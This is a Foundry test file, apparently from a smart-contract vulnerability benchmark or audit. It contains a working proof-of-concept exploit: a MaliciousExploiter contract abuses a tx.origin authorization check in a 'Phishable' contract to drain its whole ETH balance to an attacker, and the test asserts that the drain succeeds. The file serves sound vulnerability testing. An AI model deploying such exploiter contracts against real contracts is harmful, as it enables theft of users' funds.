// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract PhishableExploitTest is Test {
    Phishable public phishable;
    address public owner = address(1);
    address public attacker = address(2);
    MaliciousExploiter public exploiter;

    function setUp() public {
        // Deploy contract with owner
        vm.prank(owner);
        phishable = new Phishable(owner);
        
        // Fund contract with 1 ETH
        vm.deal(address(phishable), 1 ether);
        
        // Deploy malicious contract
        exploiter = new MaliciousExploiter(phishable, attacker);
    }

    function testMaliciousWithdrawal() public {
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(phishable).balance;
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialTotalWithdrawals = phishable.totalWithdrawals();
        console2.log("Contract balance (before):", initialContractBalance);
        console2.log("Attacker balance (before):", initialAttackerBalance);
        console2.log("Total withdrawals (before):", initialTotalWithdrawals);

        console2.log("--- Trigger Attack ---");
        // Attack: Set tx.origin to owner and call malicious contract
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin
        exploiter.executeAttack();

        console2.log("--- AFTER-Trigger State ---");
        uint256 finalContractBalance = address(phishable).balance;
        uint256 finalAttackerBalance = attacker.balance;
        uint256 finalTotalWithdrawals = phishable.totalWithdrawals();
        console2.log("Contract balance (after):", finalContractBalance);
        console2.log("Attacker balance (after):", finalAttackerBalance);
        console2.log("Total withdrawals (after):", finalTotalWithdrawals);

        // Compute the changes
        uint256 contractBalanceChange = initialContractBalance - finalContractBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        uint256 totalWithdrawalsChange = finalTotalWithdrawals - initialTotalWithdrawals;

        console2.log("Amount drained (contract balance reduction):", contractBalanceChange);
        console2.log("Attacker received:", attackerBalanceChange);
        console2.log("Total withdrawals increased by:", totalWithdrawalsChange);

        // Check if the attack was successful: contractBalanceChange should be 1 ether (the entire balance) and
        // that amount should equal the attackerBalanceChange and the totalWithdrawalsChange.
        bool attackSuccess = contractBalanceChange == 1 ether &&
                             attackerBalanceChange == 1 ether &&
                             totalWithdrawalsChange == 1 ether;

        if (attackSuccess) {
            console2.log("Vulnerability Exists: Attack succeeded in draining the contract");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to drain the contract");
        }

        // Existing assertions
        assertEq(initialContractBalance, 1 ether, "Initial contract balance incorrect");
        assertEq(finalContractBalance, 0, "Contract balance should be drained");
        assertEq(
            finalAttackerBalance,
            initialAttackerBalance + 1 ether,
            "Attacker should receive stolen funds"
        );
        // Assert that total withdrawals increased by the initial contract balance
        assertEq(finalTotalWithdrawals, initialTotalWithdrawals + 1 ether, "Total withdrawals should increase by 1 ether");
    }
}

contract MaliciousExploiter {
    Phishable public target;
    address public attacker;

    constructor(Phishable _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function executeAttack() external {
        // Exploit tx.origin vulnerability
        target.withdrawAll(attacker);
    }
}